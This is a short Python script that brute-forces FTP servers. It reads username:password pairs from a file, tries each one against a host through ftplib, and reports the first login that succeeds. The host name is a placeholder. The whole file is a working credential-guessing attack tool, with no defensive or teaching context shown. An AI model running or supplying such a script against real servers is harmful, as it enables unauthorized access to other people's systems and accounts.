import ftplib

def BruteForceLogin(hostname, passwordFile):
    passlist = open(passwordFile, 'r')
    for line in passlist.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + str(userName) + '/' + str(passWord))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('FTP login successful: ' + str(userName) + '/' + str(passWord))
            ftp.quit()
            return (userName, passWord)
        except Exception:
            pass

if __name__ == '__main__':
    hostName = '123'
    passwordFile = 'credentials.txt'
    BruteForceLogin(hostName, passwordFile)
